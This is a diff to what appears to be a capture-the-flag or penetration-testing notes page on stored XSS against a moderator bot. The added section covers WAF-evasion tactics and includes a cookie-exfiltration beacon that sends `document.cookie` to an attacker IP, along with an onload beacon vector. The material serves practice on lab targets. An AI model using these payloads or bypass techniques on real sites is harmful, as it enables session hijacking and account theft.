@@ -40,6 +40,22 @@ like `<x>` or `sqltest'...` sitting literally in the table), the sink is confirm
 payload* -- that raw reflection IS the stored-XSS proof, do not walk past it. This is frequently the INTENDED
 path to the mid-tier (moderator) flag/role on a box that also has a heavier unintended route (LFI/RCE).
 
+**Reviewer-bot + WAF stored-XSS gotchas (avoid the self-inflicted grind):**
+- **If a public writeup / known payload exists, fire its EXACT form first** before inventing variants.
+- **Obfuscate ONLY the blocked token, not the whole payload.** Submit each suspect token in
+  isolation to learn exactly what the WAF rejects (often just the literal word `cookie`, or
+  `onerror`/`<script>`). Keep everything else literal: `new Image().src='//IP/?x='+document['coo'+'kie']`
+  (split only `cookie`, keep `document`) beats splitting `document` too. Over-obfuscation
+  (`srcdoc`+`atob`+`.concat`+template-literals) usually breaks EXECUTION, not the WAF.
+- **Prefer the simplest vector that passes the WAF AND runs in the bot.** A plain
+  `<body onload="new Image().src=...">` beacon is more reliable than a `javascript:` iframe (modern
+  headless Chrome blocks `javascript:`-iframe navigation) or `srcdoc` gymnastics.
+- **Do NOT flood the moderation queue with test payloads.** The reviewer panel usually renders a
+  LIMITED window; buried test messages never surface, so "no callback" becomes ambiguous (broken
+  payload vs not-rendered). Submit ONE payload + a paired plain-`<img>` control in the SAME message
+  (same render), so a callback disambiguates render-vs-execution. Iterate in a clean queue.
+- Payload arsenal + WAF-token isolation examples: `wiki/payloads/xss.md`.
+
 DOM XSS signals in JS:
 ```javascript
 document.write(  innerHTML =  location.hash  location.search
